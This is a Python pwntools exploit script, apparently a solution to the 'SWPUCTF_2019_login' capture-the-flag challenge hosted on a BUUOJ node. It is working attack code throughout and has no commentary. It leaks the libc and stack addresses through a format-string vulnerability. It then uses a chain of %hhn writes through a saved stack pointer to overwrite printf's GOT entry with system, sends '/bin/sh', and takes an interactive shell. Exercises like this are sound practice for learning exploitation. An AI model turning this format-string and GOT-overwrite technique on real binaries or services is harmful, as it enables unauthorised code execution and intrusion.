from pwn import *

#context.log_level = 'debug'

#p = process('./SWPUCTF_2019_login')
p = remote('node4.buuoj.cn', 26933)
elf = ELF('SWPUCTF_2019_login')
#libc = ELF('libc-2.27.so')
libc = ELF('libc-2.27.buu.so')

printf_got = elf.got['printf']

p.sendlineafter(b'name', b'qwq')

p.sendlineafter(b'password: ', b'aaaa%15$p')
#gdb.attach(p, 'b *0x80485af')

p.recvuntil(b'aaaa')

libc_base = int(p.recv(10), 16) - libc.sym['__libc_start_main'] - 241
system = libc_base + libc.sym['system']
success('libc_base -> {}'.format(hex(libc_base)))

p.sendlineafter(b'again!\n', b'aaaa%6$p')

p.recvuntil(b'aaaa')

ebp = int(p.recv(10), 16) - 0x10

success('ebp -> {}'.format(hex(ebp)))

p.sendlineafter(b'again!\n', b'%' + str((ebp + 4) & 0xff).encode() + b'c%6$hhn')
p.sendlineafter(b'again!\n', b'%' + str(printf_got & 0xff).encode() + b'c%10$hhn')

p.sendlineafter(b'again!\n', b'%' + str((ebp + 5) & 0xff).encode() + b'c%6$hhn')
p.sendlineafter(b'again!\n', b'%' + str((printf_got & 0xff00) >> 8).encode() + b'c%10$hhn')

p.sendlineafter(b'again!\n', b'%' + str((ebp + 8) & 0xff).encode() + b'c%6$hhn')
p.sendlineafter(b'again!\n', b'%' + str((printf_got + 1) & 0xff).encode() + b'c%10$hhn')

p.sendlineafter(b'again!\n', b'%' + str((ebp + 9) & 0xff).encode() + b'c%6$hhn')
p.sendlineafter(b'again!\n', b'%' + str(((printf_got + 1) & 0xff00) >> 8).encode() + b'c%10$hhn')

p.sendlineafter(b'again!\n', b'%' + str((ebp + 12) & 0xff).encode() + b'c%6$hhn')
p.sendlineafter(b'again!\n', b'%' + str((printf_got + 2) & 0xff).encode() + b'c%10$hhn')

byte = [system & 0xff, (system & 0xff00) >> 8, (system & 0xff0000) >> 16]
byte_b = byte.copy()

byte.sort()
payload = '%{}c%{}$hhn%{}c%{}$hhn%{}c%{}$hhn'
payload = payload.format(
    byte[0], byte_b.index(byte[0]) + 7,
    byte[1] - byte[0], byte_b.index(byte[1]) + 7,
    byte[2] - byte[1], byte_b.index(byte[2]) + 7,
).encode()

p.sendlineafter(b'again!\n', payload)

p.sendlineafter(b'again!\n', b'/bin/sh\x00')

p.interactive()